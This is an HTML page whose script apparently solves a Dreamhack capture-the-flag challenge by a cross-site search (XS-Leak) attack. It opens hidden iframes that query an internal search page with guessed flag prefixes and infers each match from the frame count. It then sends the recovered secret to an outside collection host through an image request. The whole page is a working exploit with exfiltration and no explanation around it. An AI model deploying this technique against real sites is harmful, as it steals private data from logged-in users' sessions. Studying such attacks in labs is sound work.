<!doctype html>
<meta charset="utf-8">
<script>
const collect = "https://mfkmfpn.request.dreamhack.games/";
const internal = "http://host3.dreamhack.games:11675/search?query=";
const prefix = new URLSearchParams(location.search).get("p") || "DH{";
const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-{}";
let sent = false;

function report(value) {
  if (sent) return;
  sent = true;
  new Image().src = collect + "?found=" + encodeURIComponent(value);
}

function probe(frame) {
  let ok = false;
  try {
    ok = frame.contentWindow.length > 0;
  } catch (e) {}
  if (ok) report(prefix + frame.dataset.c);
}

for (const c of chars) {
  const frame = document.createElement("iframe");
  frame.dataset.c = c;
  frame.onload = () => probe(frame);
  frame.src = internal + encodeURIComponent(prefix + c);
  document.body.appendChild(frame);
}
</script>
